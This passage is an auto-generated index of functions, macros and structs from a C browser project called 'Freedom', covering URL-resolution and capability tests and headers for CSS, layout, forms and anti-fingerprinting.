- `test_remove_dot_segments_nulls` (line 123) `static void test_remove_dot_segments_nulls(void **state)`
- `test_resolve_absolute` (line 134) `static void test_resolve_absolute(void **state)` - *assert_int_equal(url_remove_dot_segments("/a/b/", out, sizeof out), URL_OK); assert_string_equal(out, "/a/b/"); /* trailing slash preserved } static void test_remove_dot_segments_nulls(void **state) { (void)state; char out[8]; assert_int_equal(url_remove_dot_segments(NULL, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_remove_dot_segments("/a", NULL, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_remove_dot_segments("/a", out, 0), URL_ERR_NULL_ARG); assert_int_equal(url_remove_dot_segments("/aaaaaaaaaaaaaa", out, sizeof out), URL_ERR_OVERFLOW); } /* --- url_resolve_https ---*
- `test_resolve_rejects_downgrade_and_schemes` (line 142) `static void test_resolve_rejects_downgrade_and_schemes(void **state)`
- `test_resolve_scheme_relative` (line 157) `static void test_resolve_scheme_relative(void **state)`
- `test_resolve_absolute_path` (line 165) `static void test_resolve_absolute_path(void **state)`
- `test_resolve_relative_path` (line 177) `static void test_resolve_relative_path(void **state)`
- `test_resolve_dot_segments` (line 189) `static void test_resolve_dot_segments(void **state)`
- `test_resolve_fail_closed_on_bad_base` (line 206) `static void test_resolve_fail_closed_on_bad_base(void **state)`
- `test_resolve_null_and_overflow` (line 218) `static void test_resolve_null_and_overflow(void **state)`
- `test_omnibox_navigate_https` (line 234) `static void test_omnibox_navigate_https(void **state)` - *(void)state; char out[256]; assert_int_equal(url_resolve_https(NULL, "/x", out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_https("https://h/", NULL, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_https("https://h/", "/x", NULL, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_https("https://h/", "/x", out, 0), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_https("https://h.example/", "", out, sizeof out), URL_ERR_NOT_HTTPS); char tiny[12]; assert_int_equal(url_resolve_https("https://h.example/", "/averylongpath/that/will/not/fit", tiny, sizeof tiny), URL_ERR_OVERFLOW); } /* --- url_omnibox ---*
- `test_omnibox_bare_host_gets_https` (line 247) `static void test_omnibox_bare_host_gets_https(void **state)`
- `test_omnibox_http_upgraded_to_https` (line 264) `static void test_omnibox_http_upgraded_to_https(void **state)`
- `test_omnibox_search_for_queries` (line 274) `static void test_omnibox_search_for_queries(void **state)`
- `test_omnibox_foreign_scheme_is_searched_not_executed` (line 294) `static void test_omnibox_foreign_scheme_is_searched_not_executed(void **state)`
- `test_omnibox_nulls_and_empty` (line 307) `static void test_omnibox_nulls_and_empty(void **state)`
- `test_search_rewrite_ddg_spa` (line 323) `static void test_search_rewrite_ddg_spa(void **state)` - *(void)state; char out[URL_MAX_LEN + 1]; url_omni_kind k; assert_int_equal(url_omnibox(NULL, &k, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_omnibox("x", NULL, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_omnibox("x", &k, NULL, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_omnibox("x", &k, out, 0), URL_ERR_NULL_ARG); /* empty / whitespace-only input is a (degenerate) empty search, never a crash assert_int_equal(url_omnibox("   ", &k, out, sizeof out), URL_OK); assert_int_equal(k, URL_OMNI_SEARCH); assert_string_equal(out, URL_SEARCH_ENDPOINT); } /* --- url_search_rewrite: JS-SPA search page -> no-JS server-rendered endpoint ---*
- `test_search_rewrite_leaves_others_alone` (line 340) `static void test_search_rewrite_leaves_others_alone(void **state)`
- `test_search_rewrite_nulls` (line 360) `static void test_search_rewrite_nulls(void **state)`
- `test_is_file_and_path` (line 375) `static void test_is_file_and_path(void **state)` - *static void test_search_rewrite_nulls(void **state) { (void)state; char out[URL_MAX_LEN + 1]; assert_int_equal(url_search_rewrite(NULL, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_search_rewrite("https://duckduckgo.com/?q=x", NULL, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_search_rewrite("https://duckduckgo.com/?q=x", out, 0), URL_ERR_NULL_ARG); /* not even a valid absolute https URL: fails closed, not a crash assert_int_equal(url_search_rewrite("not a url", out, sizeof out), URL_ERR_NOT_HTTPS); } /* --- url_is_file / url_file_path / url_resolve_file ---*
- `test_resolve_file_relative` (line 387) `static void test_resolve_file_relative(void **state)`
- `test_resolve_file_confinement_fail_closed` (line 407) `static void test_resolve_file_confinement_fail_closed(void **state)`
- `test_resolve_file_nulls` (line 433) `static void test_resolve_file_nulls(void **state)`
- `assert_span` (line 446) `static void assert_span(const char *p, size_t len, const char *expect)` - *} static void test_resolve_file_nulls(void **state) { (void)state; char out[URL_MAX_LEN + 1]; assert_int_equal(url_resolve_file(NULL, "x", out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_file("file:///a/b", NULL, out, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_file("file:///a/b", "x", NULL, sizeof out), URL_ERR_NULL_ARG); assert_int_equal(url_resolve_file("file:///a/b", "x", out, 0), URL_ERR_NULL_ARG); } /* --- url_split (WHATWG-location decomposition) --- /* Asserts a (ptr,len) span equals the expected C string exactly.*
- `test_split_full_url` (line 450) `static void test_split_full_url(void **state)`
- `test_split_no_port_no_path` (line 469) `static void test_split_no_port_no_path(void **state)`
- `test_split_query_without_fragment` (line 482) `static void test_split_query_without_fragment(void **state)`
- `test_split_fragment_without_query` (line 491) `static void test_split_fragment_without_query(void **state)`
- `test_split_ipv6_literal_with_port` (line 500) `static void test_split_ipv6_literal_with_port(void **state)`
- `test_extract_userinfo_basic` (line 512) `static void test_extract_userinfo_basic(void **state)` - *assert_span(u.hash, u.hash_len, "#sec"); } static void test_split_ipv6_literal_with_port(void **state) { (void)state; url_parts u; assert_int_equal(url_split("https://[2001:db8::1]:443/p", &u), URL_OK); assert_span(u.host, u.host_len, "[2001:db8::1]:443"); assert_span(u.hostname, u.hostname_len, "[2001:db8::1]"); /* brackets kept assert_span(u.port, u.port_len, "443"); assert_span(u.pathname, u.pathname_len, "/p"); } /* --- url_extract_userinfo ---*
- `test_extract_userinfo_user_only` (line 525) `static void test_extract_userinfo_user_only(void **state)`
- `test_extract_userinfo_no_userinfo` (line 538) `static void test_extract_userinfo_no_userinfo(void **state)`
- `test_extract_userinfo_non_https_passthrough` (line 550) `static void test_extract_userinfo_non_https_passthrough(void **state)`
- `test_extract_userinfo_https_subresource_no_auth` (line 562) `static void test_extract_userinfo_https_subresource_no_auth(void **state)`
- `test_extract_userinfo_nulls` (line 575) `static void test_extract_userinfo_nulls(void **state)`
- `test_extract_userinfo_at_authority_start` (line 585) `static void test_extract_userinfo_at_authority_start(void **state)`
- `test_extract_userinfo_no_at_sign` (line 598) `static void test_extract_userinfo_no_at_sign(void **state)`
- `test_extract_userinfo_empty_password` (line 611) `static void test_extract_userinfo_empty_password(void **state)`
- `test_split_fail_closed_non_https` (line 624) `static void test_split_fail_closed_non_https(void **state)`
- `main` (line 635) `int main(void)`

#### `test_webcaps.c`
**Path:** `tests/test_webcaps.c`

**Functions:**
- `mk` (line 20) `static wc_input mk(jsp_mode mode, int in_js, int in_allow)` - *projection, and the headless operator-flag path.  #include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <cmocka.h> #include "webcaps.h" /* Convenience: an input with the given trust signals, no reader, no user toggles.*
- `test_safe_is_all_off` (line 28) `static void test_safe_is_all_off(void **state)`
- `test_trusted_host_gets_all_caps` (line 38) `static void test_trusted_host_gets_all_caps(void **state)` - *in.host_in_js = in_js; in.host_in_allow = in_allow; return in; } static void test_safe_is_all_off(void **state) { (void)state; wc_caps c = wc_safe(); wc_caps zero; memset(&zero, 0, sizeof zero); assert_memory_equal(&c, &zero, sizeof c); } /* A fully trusted host (allow.conf AND js.conf, allowlist JS mode) gets everything.*
- `test_present_trust_css_images_only` (line 56) `static void test_present_trust_css_images_only(void **state)` - *Presentation-trust: allow.conf ALONE (not in js.conf) unlocks author CSS + images but NEVER the privacy-sensitive caps (net/cookies/persist/...). JS stays off since * the host is not on js.conf under the default allowlist mode.*
- `test_jspon_alone_is_not_trust` (line 85) `static void test_jspon_alone_is_not_trust(void **state)` - *Global JSP_ON enables JS everywhere, but is NOT trust: a host absent from * allow.conf gets JS yet no network / privacy caps.*
- `test_user_toggles_grant_leakfree` (line 100) `static void test_user_toggles_grant_leakfree(void **state)` - *(void)state; wc_caps c = wc_derive(mk(JSP_ON, 0, 0)); assert_true(c.js);       /* JSP_ON runs JS for every host assert_false(c.css);     /* not allowlisted, no user toggle assert_false(c.images); assert_false(c.net);     /* JSP_ON is not allow.conf trust assert_false(c.gpu); /* But JSP_ON + allow.conf IS trust. wc_caps t = wc_derive(mk(JSP_ON, 0, 1)); assert_true(t.net); assert_true(t.persist); } /* User session toggles turn on the leak-free presentation caps without any trust.*
- `test_bad_mode_fails_closed` (line 127) `static void test_bad_mode_fails_closed(void **state)` - *while the privacy caps (driven by trust, not presentation) are unaffected. static void test_reader_forces_css_images_off(void **state) { (void)state; wc_input in = mk(JSP_ALLOWLIST, 1, 1); in.reader = 1; wc_caps c = wc_derive(in); assert_false(c.css); assert_false(c.images); assert_true(c.js);       /* execution is not presentation assert_true(c.net);      /* trust unaffected by reader assert_true(c.persist); } /* Fail-closed: an out-of-range mode never enables JS (delegates to jsp_enabled).*
- `test_render_caps_projection` (line 138) `static void test_render_caps_projection(void **state)` - *} /* Fail-closed: an out-of-range mode never enables JS (delegates to jsp_enabled). static void test_bad_mode_fails_closed(void **state) { (void)state; wc_caps c = wc_derive(mk((jsp_mode)999, 1, 1)); assert_false(c.js); /* allow.conf still grants presentation-trust independent of JS. assert_true(c.css); /* but trust needs js_enabled, which is false here, so no network. assert_false(c.net); } /* The rdp_caps projection carries exactly the leak-free triple.*
- `test_from_flags_headless` (line 153) `static void test_from_flags_headless(void **state)` - *(void)state; wc_caps c = wc_derive(mk(JSP_ALLOWLIST, 1, 1)); rdp_caps r = wc_render_caps(c); assert_true(r.images); assert_true(r.css); assert_true(r.js); /* Safe caps project to all-off. rdp_caps z = wc_render_caps(wc_safe()); assert_false(z.images); assert_false(z.css); assert_false(z.js); } /* Headless operator-flag path: --js=on is the trust signal; flags are orthogonal.*
- `assert_memory_equal` (line 176) `assert_memory_equal(&(rdp_caps)`
- `main` (line 180) `int main(void)`

#### `test_zoom.c`
**Path:** `tests/test_zoom.c`

**Functions:**
- `test_clamp_bounds` (line 16) `static void test_clamp_bounds(void **state)` - *include "zoom.h"*
- `test_reset_is_default` (line 26) `static void test_reset_is_default(void **state)`
- `test_zoom_in_steps_ladder` (line 32) `static void test_zoom_in_steps_ladder(void **state)`
- `test_zoom_out_steps_ladder` (line 40) `static void test_zoom_out_steps_ladder(void **state)`
- `test_step_snaps_off_ladder` (line 48) `static void test_step_snaps_off_ladder(void **state)`
- `test_ends_are_idempotent` (line 58) `static void test_ends_are_idempotent(void **state)`
- `test_repeated_in_reaches_max` (line 66) `static void test_repeated_in_reaches_max(void **state)`
- `test_repeated_out_reaches_min` (line 78) `static void test_repeated_out_reaches_min(void **state)`
- `test_scale_factor` (line 90) `static void test_scale_factor(void **state)`
- `test_apply_scales_and_floors` (line 99) `static void test_apply_scales_and_floors(void **state)`
- `main` (line 111) `int main(void)`

#### `test_pv_styled.c`
**Path:** `tmp/test_pv_styled.c`
**File Doc:** *include <stdio.h> include <string.h> include <stdlib.h> include "html_parse.h" include "page_view.h"*

**Functions:**
- `main` (line 6) `int main()` - *include <stdio.h> include <string.h> include <stdlib.h> include "html_parse.h" include "page_view.h"*

#### `gen_psl.c`
**Path:** `tools/gen_psl.c`

**Functions:**
- `vec_push` (line 26) `static void vec_push(vec *v, const char *s)`
- `cmp_str` (line 37) `static int cmp_str(const void *a, const void *b)`
- `sort_unique` (line 43) `static void sort_unique(vec *v)` - *v->cap = v->cap ? v->cap * 2 : 1024; v->items = (char **)realloc(v->items, v->cap * sizeof *v->items); if (v->items == NULL) { fputs("oom\n", stderr); exit(1); } } v->items[v->len] = strdup(s); if (v->items[v->len] == NULL) { fputs("oom\n", stderr); exit(1); } v->len++; } static int cmp_str(const void *a, const void *b) { return strcmp(*(const char *const *)a, *(const char *const *)b); } /* Sorts then drops adjacent duplicates in place.*
- `ascii_lower` (line 55) `static void ascii_lower(char *s)` - */* Sorts then drops adjacent duplicates in place. static void sort_unique(vec *v) { qsort(v->items, v->len, sizeof *v->items, cmp_str); size_t w = 0; for (size_t i = 0; i < v->len; ++i) { if (w == 0 || strcmp(v->items[w - 1], v->items[i]) != 0) { v->items[w++] = v->items[i]; } } v->len = w; } /* ASCII-lowercases in place; UTF-8 high bytes are left untouched.*
- `emit` (line 60) `static void emit(const char *name, vec *v)`
- `main` (line 66) `int main(int argc, char **argv)`

**Macros:**
- `_POSIX_C_SOURCE` (line 14)

**Structs:**
- `vec` (line 21)

### H (52 files)

#### `browser_ui_internal.h`
**Path:** `gui/browser_ui_internal.h`
**File Doc:** *ifndef FREEDOM_BROWSER_UI_INTERNAL_H define FREEDOM_BROWSER_UI_INTERNAL_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_BROWSER_UI_INTERNAL_H` (line 2)
- `UI_FONT_SIZE` (line 23)
- `UI_TEXT_MARGIN` (line 25)
- `UI_HEADING_LEVELS` (line 26)

**Structs:**
- `ui_rgb` (line 35)
- `ui_theme` (line 37)

#### `anti_fp.h`
**Path:** `include/anti_fp.h`
**File Doc:** *ifndef FREEDOM_ANTI_FP_H define FREEDOM_ANTI_FP_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_ANTI_FP_H` (line 2)
- `FP_TIMER_RESOLUTION_MS` (line 21)
- `FP_USER_AGENT` (line 31)
- `FP_ACCEPT_LANGUAGE` (line 33)
- `FP_ACCEPT_LANGUAGE_HEADER` (line 34)
- `FP_ACCEPT_HEADER_NAV` (line 40)
- `FP_SEC_FETCH_DEST_NAV` (line 45)
- `FP_SEC_FETCH_MODE_NAV` (line 46)
- `FP_SEC_FETCH_SITE_NONE` (line 47)
- `FP_SEC_FETCH_USER_ON` (line 48)

#### `box_style.h`
**Path:** `include/box_style.h`
**File Doc:** *ifndef FREEDOM_BOX_STYLE_H define FREEDOM_BOX_STYLE_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_BOX_STYLE_H` (line 2)

**Structs:**
- `bx_edges` (line 39) - *See spec/box_style.md for the full contract.  typedef enum bx_display { BX_DISPLAY_BLOCK = 0,     /* stacks vertically, takes the available width BX_DISPLAY_INLINE,        /* flows with text; vertical margins ignored by layout BX_DISPLAY_INLINE_BLOCK,  /* in-line box with its own dimensions (img, input) BX_DISPLAY_LIST_ITEM,     /* like block, but the layout draws a marker (li) BX_DISPLAY_FLEX,          /* flex container: resolved by flex_layout BX_DISPLAY_GRID,          /* grid container: resolved by flex_layout BX_DISPLAY_NONE           /* not rendered and takes no space (head, script...) } bx_display; /* Box edges in em (multiples of the element's own font size).*
- `bx_box` (line 43)
- `bx_hplace` (line 56) - *typedef struct bx_box { bx_display display; bx_edges   margin; bx_edges   padding; } bx_box; typedef enum bx_status { BX_OK = 0, BX_ERR_NULL_ARG,  /* token or out was NULL BX_ERR_SYNTAX     /* not a recognised display keyword (fails closed) } bx_status; /* Horizontal placement of an author box inside an available width (px).*

#### `box_tree.h`
**Path:** `include/box_tree.h`
**File Doc:** *ifndef FREEDOM_BOX_TREE_H define FREEDOM_BOX_TREE_H  include <stddef.h>  include "box_style.h" include "flex_layout.h" include "page_view.h"   /* pv_box_def (box tree) */  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_BOX_TREE_H` (line 2)
- `BT_MAX_DEPTH` (line 35)
- `BT_MAX_CHILDREN` (line 36)
- `BT_MAX_POSITIONED` (line 37)
- `BT_POS_STATIC` (line 42)
- `BT_POS_RELATIVE` (line 43)
- `BT_POS_ABSOLUTE` (line 44)
- `BT_POS_FIXED` (line 45)
- `BT_POS_STICKY` (line 46)
- `BT_ALIGN_START` (line 53)
- `BT_ALIGN_CENTER` (line 54)
- `BT_ALIGN_END` (line 55)
- `BT_ALIGN_STRETCH` (line 56)

**Structs:**
- `bt_node` (line 58)
- `bt_positioned` (line 107) - *Stage 2: one positioned box in the final paint order. The GUI paints the in-flow rc_layout.rows first, then the bt_positioned list in this order (on top of in-flow content). Negative z_index entries are skipped by the GUI in * v1 (a two-pass painter would be needed to paint them behind in-flow).*

#### `browser.h`
**Path:** `include/browser.h`
**File Doc:** *ifndef FREEDOM_BROWSER_H define FREEDOM_BROWSER_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_BROWSER_H` (line 2)
- `BROWSER_URL_MAX` (line 20)
- `BROWSER_STATUS_MAX` (line 24)
- `BROWSER_STATUS_DURATION_MS` (line 25)

**Structs:**
- `browser_state` (line 27)

#### `compositor.h`
**Path:** `include/compositor.h`
**File Doc:** *ifndef FREEDOM_COMPOSITOR_H define FREEDOM_COMPOSITOR_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_COMPOSITOR_H` (line 2)

**Structs:**
- `cx_style` (line 46) - *A box's resolved style, in the SAME value-spaces as css.h: position uses css_position (CSS_POS_STATIC/RELATIVE/ABSOLUTE/FIXED/STICKY), mix_blend uses css_mix_blend (0 unset, CSS_MB_NORMAL, or a real blend), isolation uses css_isolation (0 unset, CSS_ISO_AUTO, CSS_ISO_ISOLATE). z_auto == 1 means the z-index is auto/unset (z_index is then ignored). opacity is a percent 0..100, or -1 for unset (opaque). is_float / is_inline classify the box's in-flow role. has_transform (M1.2): 1 iff the box has an author `transform` other than none (today: translate()/translateX()/translateY() only) -- a transformed element * establishes a stacking context per spec regardless of the actual offset.*
- `cx_item` (line 69) - *One box to order for painting: its layer, z-index (z_auto treated as 0 within the ZERO_Z layer), document order (stable tie-break), and an opaque caller handle * (e.g. a box index) that this module never interprets.*

#### `css.h`
**Path:** `include/css.h`
**File Doc:** *ifndef FREEDOM_CSS_H define FREEDOM_CSS_H  include <stddef.h> include "css_color.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_CSS_H` (line 2)
- `CSS_GAP_MAX` (line 65)
- `CSS_GRID_COLS_MAX` (line 66)
- `CSS_GRID_TRACKS_MAX` (line 67)
- `CSS_GRAD_STOPS_MAX` (line 68)
- `CSS_LINE_MIN` (line 69)
- `CSS_LINE_MAX` (line 70)
- `CSS_DECO_UNDERLINE` (line 75)
- `CSS_DECO_LINE_THROUGH` (line 76)
- `CSS_DECO_OVERLINE` (line 77)
- `CSS_CONTAIN_SIZE` (line 311)
- `CSS_CONTAIN_LAYOUT` (line 312)
- `CSS_CONTAIN_STYLE` (line 313)
- `CSS_CONTAIN_PAINT` (line 314)
- `CSS_BORDER_W_MAX` (line 391)
- `CSS_BORDER_SPACING_MAX` (line 392)
- `CSS_FLEX_FACTOR_MAX` (line 393)
- `CSS_GRID_SPAN_MAX` (line 394)
- `CSS_SPACING_MAX` (line 398)
- `CSS_SHADOW_MAX` (line 399)
- `CSS_LEN_MAX` (line 404)
- `CSS_LEN_UNSET` (line 405)
- `CSS_LEN_AUTO` (line 406)
- `CSS_MAX_COMPOUNDS` (line 410)
- `CSS_MAX_ATTR_SEL` (line 414)
- `CSS_MAX_PSEUDO_SEL` (line 418)
- `CSS_NTH_MAX` (line 422)
- `CSS_MEDIA_DEFAULT_WIDTH` (line 615)

**Structs:**
- `css_style` (line 429) - *A resolved presentation. Each field uses a sentinel for "unset" so the caller can layer inheritance (take the first ancestor that sets each inheriting one). The flex/grid container fields (gap/justify/grid_cols) are NOT inherited: they describe the container element itself, so the caller reads them from that * element's resolved style, not up the ancestor chain.*
- `css_media` (line 610) - *Render-time media context for evaluating @media at parse time. width_px is a fixed, normalized desktop width, so a (min/max-width) query leaks no real viewport * size (anti-fingerprinting).*
- `css_attr` (line 647) - *One element attribute, for attribute selectors ([attr], [attr=v], [attr~=v], ...). name is the lowercased local name; value is the attribute text ("" if empty). Both * alias caller storage (nothing is copied/owned).*
- `css_element` (line 657) - *An element plus its ancestor chain, for combinator matching. Each field aliases caller storage (nothing is copied/owned). parent walks toward the root (NULL at the top). A bounded/partial chain is fine: a descendant compound that would have matched a missing deeper ancestor simply does not match (fail closed). attrs/nattrs * may be empty (NULL/0): an attribute selector then simply does not match.*

#### `css_chain.h`
**Path:** `include/css_chain.h`
**File Doc:** *ifndef FREEDOM_CSS_CHAIN_H define FREEDOM_CSS_CHAIN_H  include <lexbor/html/html.h>  include "css.h" include "css_select.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_CSS_CHAIN_H` (line 2)
- `CCH_CHAIN_MAX` (line 26)
- `CCH_SIB_MAX` (line 27)
- `CCH_NTH_MAX` (line 28)

#### `css_color.h`
**Path:** `include/css_color.h`
**File Doc:** *ifndef FREEDOM_CSS_COLOR_H define FREEDOM_CSS_COLOR_H  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_CSS_COLOR_H` (line 2)
- `CC_COLOR_CURRENT` (line 59)
- `CC_COLOR_TRANSPARENT` (line 60)

**Structs:**
- `cc_rgb` (line 27)

#### `css_select.h`
**Path:** `include/css_select.h`
**File Doc:** *ifndef FREEDOM_CSS_SELECT_H define FREEDOM_CSS_SELECT_H  include <stddef.h> include <string.h>  include "css.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Functions:**
- `csel_lower_ch` (line 122) `static inline char csel_lower_ch(char c)` - *Parses the complex selector s[a,b) into *sel (spec computed; order/rule left to * the caller). Returns 1 if supported, 0 to drop the selector (fail closed). int csel_parse(const char *s, size_t a, size_t b, css_sel *sel); /* True if *sel matches element *el against its ancestor chain. Pure, bounded. int csel_matches(const css_sel *sel, const css_element *el); /* --- ASCII helpers shared by the selector and cascade sides (internal) ---*
- `csel_ci_eq` (line 126) `static inline int csel_ci_eq(const char *a, const char *b)`
- `csel_span_eq` (line 136) `static inline int csel_span_eq(const char *a, const char *b, size_t n, int ci)` - *static inline char csel_lower_ch(char c) { return (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c; } static inline int csel_ci_eq(const char *a, const char *b) { while (*a != '\0' && *b != '\0') { if (csel_lower_ch(*a) != csel_lower_ch(*b)) return 0; ++a; ++b; } return *a == '\0' && *b == '\0'; } /* True if a[0,n) equals b[0,n) up to n chars (b NUL-terminated), case-folded when ci.*
- `csel_substr` (line 147) `static inline int csel_substr(const char *hay, const char *needle, int ci)` - *Substring test (used both to drop any value carrying url() — always ci — and by * the attribute `*=` operator). A non-empty needle only; an empty one never matches.*
- `csel_ident_ch` (line 154) `static inline int csel_ident_ch(char c)`

**Macros:**
- `FREEDOM_CSS_SELECT_H` (line 2)
- `CSS_TOK_MAX` (line 27)
- `CSS_MAX_CLASSES_PER_SEL` (line 28)
- `CSS_MAX_SUB_SELS` (line 52)
- `CSS_SUB_MAX_ATTRS` (line 53)

**Structs:**
- `css_attr_match` (line 56) - *Sub-selector for :not()/:is()/:where(): a simple compound with only tag/.class/#id/[attr] (no combinators, no pseudo-classes inside * sub-selectors). Bounded: CSS_MAX_SUB_SELS per selector, one level deep. #define CSS_MAX_SUB_SELS 4 #define CSS_SUB_MAX_ATTRS 1 /* One attribute selector inside a compound: name OP value, with a case flag.*
- `css_sub_sel` (line 63)
- `css_pseudo_match` (line 77) - *One pseudo-class inside a compound. a/b are the An+B coefficients of the nth-child family (unused otherwise). sub_first/sub_count index into the * parent css_sel.subs[] for :not/:is/:where, or -1/0 for no sub-selectors.*
- `css_compound` (line 86) - *One compound selector: optional type, optional id, zero+ classes, zero+ [attr], * zero+ pseudo-classes.*
- `css_sel` (line 103) - *A complex selector: a chain of compounds, parts[nparts-1] being the subject (the element a rule styles). comb[k] (k>=1) is the combinator to the LEFT of parts[k]; comb[0] is unused. A single compound is nparts == 1. subs[] holds sub-selectors * for :not()/:is()/:where() pseudo-classes, indexed by css_pseudo_match.sub_first.*

#### `data_url.h`
**Path:** `include/data_url.h`
**File Doc:** *ifndef FREEDOM_DATA_URL_H define FREEDOM_DATA_URL_H  include <stddef.h> include <stdint.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_DATA_URL_H` (line 2)
- `DU_MAX_ENCODED_LEN` (line 43)

#### `disk_store.h`
**Path:** `include/disk_store.h`
**File Doc:** *ifndef FREEDOM_DISK_STORE_H define FREEDOM_DISK_STORE_H  include <stddef.h> include <stdint.h>  include "local_store.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_DISK_STORE_H` (line 2)

#### `dom.h`
**Path:** `include/dom.h`
**File Doc:** *ifndef FREEDOM_DOM_H define FREEDOM_DOM_H  include <stddef.h> include <stdint.h>  include "html_parse.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_DOM_H` (line 2)
- `DOM_NODE_NONE` (line 37)

#### `dom_debug.h`
**Path:** `include/dom_debug.h`
**File Doc:** *ifndef FREEDOM_DOM_DEBUG_H define FREEDOM_DOM_DEBUG_H  include <stddef.h>  include "render_doc.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_DOM_DEBUG_H` (line 2)
- `DD_FIELD_MAX` (line 28)

#### `download.h`
**Path:** `include/download.h`
**File Doc:** *ifndef FREEDOM_DOWNLOAD_H define FREEDOM_DOWNLOAD_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_DOWNLOAD_H` (line 2)
- `DL_NAME_MAX` (line 28)
- `DL_FALLBACK_NAME` (line 30)
- `DL_MAX_BYTES` (line 31)

#### `flex_layout.h`
**Path:** `include/flex_layout.h`
**File Doc:** *ifndef FREEDOM_FLEX_LAYOUT_H define FREEDOM_FLEX_LAYOUT_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_FLEX_LAYOUT_H` (line 2)
- `FX_MAX_ITEMS` (line 28)

**Structs:**
- `fx_item` (line 40) - *Upper bound on items per flex line / grid columns. Caps the O(n) shrink loop and * keeps the fixed-size scratch buffers bounded (anti-DoS; no VLAs). #define FX_MAX_ITEMS 512u typedef enum fx_justify { FX_JUSTIFY_START = 0, FX_JUSTIFY_END, FX_JUSTIFY_CENTER, FX_JUSTIFY_SPACE_BETWEEN, FX_JUSTIFY_SPACE_AROUND, FX_JUSTIFY_SPACE_EVENLY } fx_justify; /* One flex item, all sizes in px. Negative fields are treated as 0.*
- `fx_result` (line 48) - *FX_JUSTIFY_SPACE_BETWEEN, FX_JUSTIFY_SPACE_AROUND, FX_JUSTIFY_SPACE_EVENLY } fx_justify; /* One flex item, all sizes in px. Negative fields are treated as 0. typedef struct fx_item { double basis;   /* flex-basis: preferred main-axis size double grow;    /* flex-grow factor double shrink;  /* flex-shrink factor double min;     /* minimum main-axis size; the item never shrinks below it } fx_item; /* One resolved item: main-axis offset from the container content start, and size.*

#### `form.h`
**Path:** `include/form.h`
**File Doc:** *ifndef FREEDOM_FORM_H define FREEDOM_FORM_H  include <stddef.h>  include "url.h"  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_FORM_H` (line 2)
- `FM_URL_MAX` (line 28)
- `FM_BODY_MAX` (line 30)
- `FM_MAX_FIELDS` (line 31)

**Structs:**
- `fm_field` (line 37) - *One named control. value == NULL is treated as the empty value; name == NULL is * skipped by fm_encode and rejected (FM_BLOCK_INVALID) by fm_build.*
- `fm_plan` (line 52)

#### `freebug.h`
**Path:** `include/freebug.h`
**File Doc:** *ifndef FREEDOM_FREEBUG_H define FREEDOM_FREEBUG_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_FREEBUG_H` (line 2)
- `FB_MAX_ENTRIES` (line 56)
- `FB_MAX_ENTRY_BYTES` (line 57)
- `FB_MAX_TOTAL_BYTES` (line 58)
- `FB_MAX_FILE_BYTES` (line 62)

**Structs:**
- `fb_entry` (line 36) - *One captured console message. text and file are owned by the buffer (NUL-terminated). file/line/col are an optional source location (developer aid): file is NULL and line/col 0 when the location is unknown (e.g. a plain * console.log, whose call site is not tracked).*
- `fb_buffer` (line 46) - *One captured console message. text and file are owned by the buffer (NUL-terminated). file/line/col are an optional source location (developer aid): file is NULL and line/col 0 when the location is unknown (e.g. a plain * console.log, whose call site is not tracked). typedef struct fb_entry { int    level; char  *text; size_t len;  /* bytes in text, excluding the trailing NUL char  *file; /* owned source name, or NULL when unknown int    line; /* 1-based source line, or 0 if unknown int    col;  /* 1-based source column, or 0 if unknown } fb_entry; /* An ordered, bounded list of entries. Zero-initialise with fb_buffer_init.*

#### `hls.h`
**Path:** `include/hls.h`
**File Doc:** *ifndef FREEDOM_HLS_H define FREEDOM_HLS_H  include <stddef.h>  ifdef __cplusplus error "Freedom is pure C (C11). C++ is not supported." endif*

**Macros:**
- `FREEDOM_HLS_H` (line 2)

**Structs:**
